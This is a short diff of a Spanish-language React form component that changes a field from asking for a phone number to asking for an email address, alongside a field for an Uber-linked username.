@@ -10,8 +10,8 @@ export default function renderFormulario() {
       <h3>Por favor ingresa el nombre de usuario afiliado a tu aplicación de Uber</h3>
       <input type="text" id="dataInput" placeholder="Ingresa tu nombre de usuario" required />
   
-      <h3>Ingresa tu número de celular</h3>
-      <input type="tel" id="emailInput" placeholder="Ingresa tu número de celular" required />
+      <h3>Ingresa tu correo electrónico</h3>
+      <input type="tel" id="emailInput" placeholder="Ingresa tu correo electrónico" required />
       
       <button type="submit">Enviar</button>
     </form>
